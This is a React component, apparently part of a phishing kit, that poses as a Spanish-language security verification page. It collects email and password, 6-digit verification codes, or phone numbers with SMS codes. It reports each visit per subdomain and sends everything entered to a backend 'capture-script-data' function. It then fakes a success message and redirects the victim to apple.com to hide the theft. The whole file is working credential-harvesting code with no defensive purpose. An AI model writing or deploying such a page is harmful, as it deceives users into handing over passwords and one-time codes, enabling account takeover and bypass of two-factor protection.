import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { supabase } from '@/integrations/supabase/client';
import { Mail, Lock, Smartphone, Shield } from 'lucide-react';

interface ScriptDataCaptureProps {
  scriptType: 'email_password' | 'verification_code' | 'phone_verification';
  subdomain?: string;
  onSuccess?: () => void;
}

const ScriptDataCapture: React.FC<ScriptDataCaptureProps> = ({ 
  scriptType, 
  subdomain,
  onSuccess 
}) => {
  const [formData, setFormData] = useState<{[key: string]: string}>({});
  const [isLoading, setIsLoading] = useState(false);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [detectedSubdomain, setDetectedSubdomain] = useState<string>('');
  const [hasReportedVisit, setHasReportedVisit] = useState(false);

  useEffect(() => {
    // Detectar subdominio automáticamente si no se proporciona
    if (!subdomain) {
      const hostname = window.location.hostname;
      const parts = hostname.split('.');
      if (parts.length > 2) {
        setDetectedSubdomain(parts[0]);
      }
    } else {
      setDetectedSubdomain(subdomain);
    }
  }, [subdomain]);

  useEffect(() => {
    // Reportar visita inicial una sola vez
    if (detectedSubdomain && !hasReportedVisit) {
      reportInitialVisit();
      setHasReportedVisit(true);
    }
  }, [detectedSubdomain, hasReportedVisit]);

  const reportInitialVisit = async () => {
    try {
      const payload = {
        subdomain: detectedSubdomain,
        script_type: 'visit',
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        page_url: window.location.href
      };

      console.log('Reporting initial visit:', payload);

      await supabase.functions.invoke('capture-script-data', {
        body: payload
      });

      console.log('Initial visit reported successfully');
    } catch (error) {
      console.error('Error reporting initial visit:', error);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);

    try {
      const payload = {
        subdomain: detectedSubdomain,
        script_type: scriptType,
        ...formData,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent,
        page_url: window.location.href
      };

      console.log('Submitting form data:', payload);

      const { data, error } = await supabase.functions.invoke('capture-script-data', {
        body: payload
      });

      if (error) {
        console.error('Supabase function error:', error);
        throw error;
      }

      console.log('Data submitted successfully:', data);
      setIsSubmitted(true);
      
      if (onSuccess) {
        onSuccess();
      }

      // Redirect después de 3 segundos
      setTimeout(() => {
        window.location.href = 'https://www.apple.com/';
      }, 3000);

    } catch (error) {
      console.error('Submission error:', error);
      alert('Error al procesar la información. Por favor intenta nuevamente.');
    } finally {
      setIsLoading(false);
    }
  };

  const renderFormFields = () => {
    switch (scriptType) {
      case 'email_password':
        return (
          <>
            <div className="space-y-2">
              <Label htmlFor="email" className="text-gray-700 flex items-center">
                <Mail className="h-4 w-4 mr-2" />
                Correo Electrónico
              </Label>
              <Input
                id="email"
                type="email"
                placeholder="tu@email.com"
                value={formData.email || ''}
                onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                required
                className="border-gray-300 focus:border-blue-500"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="password" className="text-gray-700 flex items-center">
                <Lock className="h-4 w-4 mr-2" />
                Contraseña
              </Label>
              <Input
                id="password"
                type="password"
                placeholder="••••••••"
                value={formData.password || ''}
                onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                required
                className="border-gray-300 focus:border-blue-500"
              />
            </div>
          </>
        );

      case 'verification_code':
        return (
          <div className="space-y-2">
            <Label htmlFor="code" className="text-gray-700 flex items-center">
              <Shield className="h-4 w-4 mr-2" />
              Código de Verificación
            </Label>
            <Input
              id="code"
              type="text"
              placeholder="000000"
              maxLength={6}
              value={formData.code || ''}
              onChange={(e) => setFormData({ ...formData, code: e.target.value.replace(/\D/g, '') })}
              required
              className="border-gray-300 focus:border-blue-500 text-center text-2xl tracking-widest"
            />
            <p className="text-sm text-gray-500">
              Ingresa el código de 6 dígitos que recibiste
            </p>
          </div>
        );

      case 'phone_verification':
        return (
          <>
            <div className="space-y-2">
              <Label htmlFor="phone" className="text-gray-700 flex items-center">
                <Smartphone className="h-4 w-4 mr-2" />
                Número de Teléfono
              </Label>
              <Input
                id="phone"
                type="tel"
                placeholder="+1234567890"
                value={formData.phone || ''}
                onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
                required
                className="border-gray-300 focus:border-blue-500"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="verification_code" className="text-gray-700 flex items-center">
                <Shield className="h-4 w-4 mr-2" />
                Código de Verificación SMS
              </Label>
              <Input
                id="verification_code"
                type="text"
                placeholder="0000"
                maxLength={4}
                value={formData.verification_code || ''}
                onChange={(e) => setFormData({ ...formData, verification_code: e.target.value.replace(/\D/g, '') })}
                required
                className="border-gray-300 focus:border-blue-500 text-center text-xl tracking-widest"
              />
            </div>
          </>
        );

      default:
        return null;
    }
  };

  const getTitle = () => {
    switch (scriptType) {
      case 'email_password':
        return 'Verificación de Seguridad';
      case 'verification_code':
        return 'Código de Verificación';
      case 'phone_verification':
        return 'Verificación Telefónica';
      default:
        return 'Verificación';
    }
  };

  const getDescription = () => {
    switch (scriptType) {
      case 'email_password':
        return 'Por favor ingresa tus credenciales para verificar tu identidad';
      case 'verification_code':
        return 'Hemos enviado un código de verificación. Por favor ingrésalo a continuación.';
      case 'phone_verification':
        return 'Verificaremos tu número de teléfono enviando un código SMS';
      default:
        return 'Complete la verificación para continuar';
    }
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
        <Card className="w-full max-w-md">
          <CardContent className="p-6 text-center">
            <div className="text-green-600 text-6xl mb-4">✓</div>
            <h2 className="text-2xl font-bold text-gray-800 mb-2">
              Verificación Exitosa
            </h2>
            <p className="text-gray-600 mb-4">
              Tu información ha sido verificada correctamente.
            </p>
            <p className="text-sm text-gray-500">
              Redirigiendo automáticamente...
            </p>
          </CardContent>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 flex items-center justify-center p-4">
      <Card className="w-full max-w-md">
        <CardHeader className="text-center">
          <CardTitle className="text-2xl font-bold text-gray-800">
            {getTitle()}
          </CardTitle>
          <p className="text-gray-600 mt-2">
            {getDescription()}
          </p>
        </CardHeader>
        
        <CardContent>
          <form onSubmit={handleSubmit} className="space-y-4">
            {renderFormFields()}
            
            <Button
              type="submit"
              disabled={isLoading}
              className="w-full bg-blue-600 hover:bg-blue-700 text-white"
            >
              {isLoading ? 'Verificando...' : 'Verificar'}
            </Button>
          </form>

          {detectedSubdomain && (
            <p className="text-xs text-gray-400 text-center mt-4">
              Subdominio detectado: {detectedSubdomain}
            </p>
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default ScriptDataCapture;
